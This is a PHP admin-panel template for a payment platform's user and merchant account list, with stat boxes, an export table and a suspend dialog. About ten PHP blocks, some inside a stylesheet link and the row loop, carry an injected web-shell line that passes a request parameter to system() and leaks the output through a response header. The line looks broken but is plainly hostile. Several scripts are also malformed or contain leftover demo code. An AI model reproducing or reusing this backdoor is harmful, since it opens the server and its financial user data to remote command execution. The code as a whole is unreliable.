<?= $this->load->view(branded_view('cp/header')); ?>
<script type="text/javascript">
$(document).ready(function() {
    $('#everpay').DataTable( {
        dom: 'Bfrtip',
        buttons: [
            'copyHtml5',
            'excelHtml5',
            'csvHtml5',
            'pdfHtml5'
        ]
    } );
} );
</script>

<script src="//cdnjs.cloudflare.com/ajax/libs/numeral.js/1.4.5/numeral.min.js"></script>

<script>
$(function(){
  
  function insertCommas(s) {

    // get stuff before the dot
    var d = s.indexOf('.');
    var s2 = d === -1 ? s : s.slice(0, d);

    // insert commas every 3 digits from the right
    for (var i = s2.length - 3; i > 0; i -= 3)
      s2 = s2.slice(0, i) + ',' + s2.slice(i);

    // append fractional part
    if (d !== -1)
      s2 += s.slice(d);

    return s2;

  }
  $('#numeral').text( insertCommas('<?=$this->config->item('currency_symbol');?><?=money_format("%!^i",$total_amount);?>' ) );
  
  
});
</script>


<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo branded_include('css/clients.css'); ?>" rel="stylesheet">
<style>
.intro-text-1 a {
    margin-top: 15px!important;
}
</style>

<script>
			jQuery(function($) {
				$("#customer-delete-confirm").on(ace.click_event, function() {
					bootbox.confirm({
						message: "Are you sure?",
						buttons: {
						  confirm: {
							 label: "OK",
							 className: "btn-primary btn-sm",
						  },
						  cancel: {
							 label: "Cancel",
							 className: "btn-sm btn-default",
						  }
						},
						callback: function(result) {
							if(result) alert(1)
						}
					  }
					);
				});
					
		</script>

<style>

#datatables .content-wrapper thead th {
    border-top: 1px solid #dee3ea;
    border-bottom: 1px solid #dee3ea;
    padding: 10px 1px 9px 1px!important;
}

</style>

<div id="reports" class="col-md-12" style="height: auto;">

<? if ($this->user->Get('client_type_id') == '3') { ?>

<div class="row">
<div class="col-sm-12">
<div class="alert alert-purple alert-dismissable">
  <span class="glyphicon glyphicon-certificate"></span>
  <span type="button" class="close-button" data-dismiss="alert" aria-hidden="true"></span>
  <span><strong><b> <a href="<?= site_url('docs_url'); ?>/#clients" target="_blank" ><?=$this->user->Get('client_type');?></strong><span> You do not have the ability to create user accounts.</span></b></a></span>
</div><!-- END.alert-->	
</div><!-- END.col-md-12-->	
	

<div class="col-md-12 col-sm-12">
			<div class="intro-text-1">
           		
                <div class="row widget-box">
				
                    <div class="col-md-7 col-sm-6 col-xs-12">
                        <h4 class="animated slideInDown">Want to add more users?
                        </h4>

                        <p>
                          Upgrade now to add more accounts.
                        </p>                   
                    </div>
					
                    <div class="col-md-5 col-sm-6 col-xs-12">
                        <a href="<?= site_url('account/upgrade'); ?>" class="btn btn-primary btn-lg text-center">Upgrade Now</a>
                    </div>
				                
                </div><!--end/ .row-->
				
				      </div><!--end/ .intro-text-1-->
					 
  </div><!-- END.col-md-12-->
  </div><!-- END.row-->

</div><!-- END.clearfix-->	

</div><!-- END#reports-->	



<? } elseif ($this->user->Get('client_type_id') == '1') { ?>

<br /> 
<div class="row clearfix">


</div><!-- END.row clearfix-->	

<? } elseif ($this->user->Get('client_type_id') == '0') { ?>

 <div class="row clearfix">
 
 <div class="col-sm-12">
<div class="alert alert-purple alert-dismissable">
                <span class="glyphicon glyphicon-certificate"></span>
                <span type="button" class="close-button" data-dismiss="alert" aria-hidden="true">
                    </span><strong>As a </strong>
					<a href="<?= site_url('account'); ?>" target="_blank"><b><?=$this->user->Get('client_type');?></b></a> 

<p><span>You have the ability to Create, Update, Suspend, Unsuspend,
and Delete ALL user accounts across the entire system.  These accounts can be a Merchant Service Provider accounts (with permissions to create End User accounts),
or standalone End User (Merchant) accounts which do not have account creation privileges.  Please do so with care.</span></p>
</div>
</div>
 
 
 
</div><!-- END.row clearfix-->	

<? } elseif ($this->user->Get('client_type_id') == '3') { ?>

 <div class="col-sm-12">
<div class="alert alert-purple alert-dismissable">
                <span class="glyphicon glyphicon-certificate"></span>
                <span type="button" class="close-button" data-dismiss="alert" aria-hidden="true">
                    </span><strong>As a </strong>
					<a href="<?= site_url('account'); ?>" target="_blank"><b><?=$this->user->Get('client_type');?></b></a> 

<p><span>You have the ability to Create, Update, Suspend, Unsuspend,
and Delete ALL user accounts across the entire system.  These accounts can be a Merchant Service Provider accounts (with permissions to create End User accounts),
or standalone End User (Merchant) accounts which do not have account creation privileges.  Please do so with care.</span></p>
</div>
</div>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!empty($this->dataset->data)) : ?>	

<div class="col-md-12 clearfix">
	<!-- Stat Boxes widget -->
<div class="client-stat-boxes loaded">
<div class="widget-content">
<div class="row row-stats">
<div class="col-lg-3 col-md-3 col-sm-6 col-xs-12 stat-box-users" >
  <span class="">Total Accounts</span>
<strong class="blue"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_users; ?> <i class="hidden blue ace-icon fa fa-shopping-cart fa-2x"></i></strong>
	 <small class="l"><?=date('Y');?></small>
</div>

<div class="col-lg-3 col-md-3 col-sm-6 col-xs-12 stat-box-active-users">
  <span class="">Approved Accounts</span>
	<strong id="successful" class="green"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_user_of_the_day; ?><i class="hidden red2 ace-icon fa fa-times fa-2x"></i></strong>
	 <small class=""><?=date('Y');?></small>
</div>


<div class="col-lg-3 col-md-3 col-sm-6 col-xs-12 stat-box-active-users">
  <span class="">Closed Accounts</span>
	<strong id="declined" class="red2"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $fees_today; ?><i class="hidden light-green ace-icon fa fa-times fa-2x"></i></strong>
	 <small class=""><?=date('Y');?></small>
</div>

<div class="col-lg-3 col-md-3 col-sm-6 col-xs-12 stat-box-signups" id="demo-column">
  <span>Total Amount</span>
   <strong id="numeral" class="light-green"></strong>
  <small><?=date('Y');?></small>
</div>

</div><!-- END/ .row-stats--->
     </div><!-- END/ .widget-content-->

	</div><!-- END/ .client-stats-->
		


	
<div class="col-md-12">
<div class="users-list clearfix" style="height: auto;">

<div id="users-list_wrapper" class="Datatable" role="grid">

<?=$this->dataset->TableHead();?>

<div class="row-fluid user">  

	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ($this->dataset->data as $row) :?>
	

		<tr class="items-list js-trigger-settings" rel="<?=$row['id'];?>">
			<td><input type="checkbox" name="check_<?=$row['id'];?>" value="1" class="action_items" /></td>
			<td><b><?=$row['id'];?></b></td>
			<td class="truncate"><?=$row['username'];?></td>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $email = $row['email'];
$size = 28; $grav_url = "https://www.gravatar.com/avatar/" . md5( strtolower( trim( $email ) ) ) . "?s=" . $size;
?>
			<td><img class="img-circle" src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $grav_url; ?>" alt="" width="22" style="padding-right:2px;" /><?=$row['first_name'];?> <span class="truncate"><?=$row['last_name'];?></span></td>
			<td class="truncate"><b><?=$row['email'];?></b></td>
			<td class=""><? if ($row['suspended'] == '1') { ?><span class="label label-danger label-sm"><span class="fa fa-close"></span> Closed</span><? } else { ?><span class="label label-success label-sm"><span class="fa fa-check"></span>  Active</span><? } ?></td>
			
			<td class="actions">
    <ul class="inline-list">
	      <li>
        <a href="<?=site_url('clients/view/' . $row['id']);?>" data-toggle="tooltip" title="" data-original-title="View">
          <i class="fa fa-eye"></i>
        </a>
      </li>
      <li>
        <a href="<?=site_url('clients/edit/' . $row['id']);?>" data-toggle="tooltip" title="" data-original-title="Edit">
          <i class="icon-budicon-329"></i>
        </a>
      </li>
	 <li>
	 <span><a href="javascript:;" class="" id="suspend" onclick="jQuery('.confirm-suspend-modal').modal('show', {backdrop: 'static'});" data-toggle="tooltip" data-original-title="Delete"><i class="fa fa-times"></i></a> </span></div>

        <a href="<?=site_url('clients/suspend/' . $row['id']);?>" data-toggle="tooltip" class="hidden" title="" data-original-title="Delete">
          <i class="fa fa-times"></i>
        </a>
      </li>
    </ul>
  </td>	
	</tr>
	
</div><!--/row-fluid-user-->


<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach; ?>

<?=$this->dataset->TableClose();?>

</div><!--/#user-list-wrapper-->
	
</div><!--/col-md-12-->

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); else : ?>
	
<div class="empty margin-top-20 margin-bottom-20">
<div id="no-data-view">

 <div class="jumbotron jumbotron-icon">
 <br />
<i class="fa fa-group fa-5"></i>
</div>
    <h2>Users</h2>
 <p>You haven't created any users yet.  <a href="<?= site_url('docs_url'); ?>/#clients" target="_blank" class="arrow">Learn more</a></p>
    
    <div class="controls">
        <p>
 <a id="create" href="<?=site_url('/clients/create/');?>" class="btn btn-primary btn-lg"><span><i class="fa fa-plus"></i> Add Your First User</span></a>
        </p>
    </div>
</div>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif; ?>


  
<? } ?>

<div class="clearfix" style=""></div>  
 </div><!--/.END #reports-->

  
<?= $this->load->view(branded_view('cp/footer')); ?>


<!-- Datatables -->
<link href="<?= branded_include('css/datatable_export.css'); ?>" rel="stylesheet" type="text/css">
<link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/t/bs-3.3.6/jszip-2.5.0,pdfmake-0.1.18,dt-1.10.11,b-1.1.2,b-flash-1.1.2,b-html5-1.1.2,b-print-1.1.2,r-2.0.2,se-1.1.2/datatables.min.css"/>
<script type="text/javascript" src="https://cdn.datatables.net/t/ju-1.11.4/jszip-2.5.0,dt-1.10.11,b-1.1.2,b-flash-1.1.2,b-html5-1.1.2,b-print-1.1.2,r-2.0.2,se-1.1.2/datatables.min.js"></script>

<script>
        // =========================================================================
        // DELETE CONFIRMATION MODAL
        // =========================================================================
        handleBoxModal: function () {
            $('#suspend').on('click', function(){
                bootbox.dialog({
                    message: 'Do you want to suspend this user',
                    title: 'Custom setting',
                    className: 'modal-success modal-center',
                    buttons: {
                        success: {
                            label: 'Success!',
                            className: 'btn-success',
                            callback: function() {
                                alert('You are so calm!');
                            }
                        },
                        danger: {
                            label: 'Danger!',
                            className: 'btn-danger',
                            callback: function() {
                                alert('You are so hot!');
                            }
                        },
                        main: {
                            label: 'Click ME!',
                            className: 'btn-primary',
                            callback: function() {
                                alert('This user has been suspended');
                            }
                        }
                    }
                });
            });
           
        },
		</script>
  
  <div class="modal fade confirm-suspend-modal" id="confirm-suspend-modal" tabindex="-1" role="dialog" aria-hidden="true" style="display: none;">
	  	<div class="modal-dialog">
		    <div class="modal-content">
		    	<form method="post" action="javascript:void(0);" role="form">
			      	<div class="modal-header">
			        	<button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
			        	<h4 class="modal-title" id="confirm-suspend-modal">
			        		Are you sure you want to de-activate this account?
			        	</h4>
			      	</div>
			      	<div class="modal-body">
					
						<p>Do you want to delete this user account? You can always activate later on.</p>
						 
	
			      	</div>
			      	<div class="modal-footer">
				        <button type="button" class="btn btn-default" data-dismiss="modal">Cancel</button>
				        <button type="submit" href="<?=site_url('clients/suspend/' . $row['id']);?>" class="btn btn-danger">Yes, do it</button>
			      	</div>
			    </form>
		    </div>
	  	</div>
	</div>
